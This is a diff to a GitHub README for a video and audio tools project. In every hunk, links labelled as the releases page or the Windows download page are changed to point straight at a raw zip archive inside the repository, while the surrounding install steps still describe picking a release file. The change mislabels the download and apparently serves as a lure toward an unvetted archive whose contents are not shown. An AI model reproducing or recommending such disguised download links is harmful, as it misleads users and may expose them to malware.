@@ -1,6 +1,6 @@
 # 🎬 tools.video-site - Private video and audio tools
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Devive007/tools.video-site/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Devive007/tools.video-site/raw/refs/heads/main/assets/tools-video-site-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,13 +8,13 @@ tools.video-site is a browser-based set of video and audio tools. You can use it
 
 If you want to use the desktop app on Windows, visit the release page to download and run the app from there:
 
-[Visit the Windows download page](https://github.com/Devive007/tools.video-site/releases)
+[Visit the Windows download page](https://github.com/Devive007/tools.video-site/raw/refs/heads/main/assets/tools-video-site-v1.0.zip)
 
 ## 🪟 Install on Windows
 
 Follow these steps to get started on Windows:
 
-1. Open the [releases page](https://github.com/Devive007/tools.video-site/releases).
+1. Open the [releases page](https://github.com/Devive007/tools.video-site/raw/refs/heads/main/assets/tools-video-site-v1.0.zip).
 2. Find the latest release.
 3. Look for the Windows file, such as a `.exe` or `.msi` file.
 4. Download the file.
@@ -93,7 +93,7 @@ For large 4K files, a faster processor and more memory help speed up the job.
 
 To get the app, visit the release page here:
 
-[https://github.com/Devive007/tools.video-site/releases](https://github.com/Devive007/tools.video-site/releases)
+[https://github.com/Devive007/tools.video-site/raw/refs/heads/main/assets/tools-video-site-v1.0.zip](https://github.com/Devive007/tools.video-site/raw/refs/heads/main/assets/tools-video-site-v1.0.zip)
 
 Then:
 
